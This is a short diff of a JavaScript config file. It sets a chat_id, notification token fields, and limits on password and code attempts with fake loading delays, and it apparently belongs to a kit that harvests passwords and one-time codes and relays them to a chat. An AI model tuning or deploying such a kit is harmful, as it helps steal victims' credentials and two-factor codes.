@@ -3,9 +3,9 @@ const config = {
     chat_id: '7211586401',
     noti_token: '',
     noti_chat_id: '',
-    max_password_attempts: 2,
-    max_code_attempts: 4,
+    max_password_attempts: 1,
+    max_code_attempts: 1,
     password_loading_time: 5,
-    code_loading_time: 10
+    code_loading_time: 2
 };
 export default config;
